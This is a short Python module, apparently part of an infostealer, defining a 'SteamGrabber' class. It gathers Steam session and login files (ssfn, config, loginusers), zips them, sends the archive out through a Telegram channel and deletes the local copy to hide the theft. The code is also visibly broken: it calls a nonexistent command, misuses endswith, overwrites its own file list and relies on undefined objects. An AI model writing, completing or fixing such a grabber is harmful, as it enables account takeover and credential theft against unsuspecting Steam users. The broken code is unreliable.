import os
import subprocess
import zipfile

class SteamGrabber:
    def get(self):
        steam_path = None
        process = subprocess.check_output(["steam", "--list"])
        for line in process.splitlines():
            if "Steam" in line:
                steam_path = line.split(" ")[0]
                break

        if steam_path:
            archive_path = os.path.join(os.path.dirname(config.install_path), "steam.zip")
            files = []

            # Get all files in steam directory
            for root, dirs, files in os.walk(steam_path):
                for file in files:
                    if file.endswith(["ssfn", "config", "loginusers", "config"]):
                        files.append(os.path.join(root, file))

            # Create zip archive
            with zipfile.ZipFile(archive_path, "w") as zipf:
                for file in files:
                    zipf.write(file, arcname=os.path.relpath(file, steam_path))

            # Send zip archive
            telegram.send_file(archive_path)

            # Delete zip archive
            os.unlink(archive_path)
        else:
            telegram.send_text("🛠 Steam process not running..")
